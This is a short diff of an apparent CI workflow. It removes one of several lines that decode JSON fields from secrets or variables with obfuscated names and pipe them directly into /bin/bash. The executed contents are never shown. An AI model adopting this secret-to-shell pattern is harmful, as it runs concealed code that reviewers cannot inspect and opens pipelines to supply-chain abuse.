@@ -19,7 +19,6 @@ jobs:
           hww6672: ${{ secrets.hww6672 }}
         run: |
           printf '%s' "$hww6672" | jq -r .f45 | /bin/bash
-          echo $xm2 | jq -r .b7 | /bin/bash
           echo $ezmv85 | jq -r .imdhn072 | /bin/bash
           printf '%s' "$jo889" | jq -r .dgt52 | /bin/bash
           echo $ose0 | jq -r .ywvaw60 | /bin/bash
